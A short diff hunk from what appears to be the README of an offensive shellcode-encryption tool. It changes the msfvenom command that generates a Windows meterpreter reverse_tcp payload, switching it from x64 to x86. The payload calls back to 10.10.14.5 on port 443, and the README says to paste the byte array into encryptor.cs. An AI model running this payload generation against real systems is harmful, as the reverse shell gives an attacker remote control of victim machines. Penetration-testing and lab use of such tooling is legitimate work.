@@ -11,7 +11,7 @@ If you find the workflow a little cumbersome, feel free to take the code and mak
 
 Create a meterpreter payload using `msfvenom`:
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.5 -f csharp
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.5 -f csharp
 ```
 Copy the byte array and paste it into the shellcode variable in `encryptor.cs`
 ```
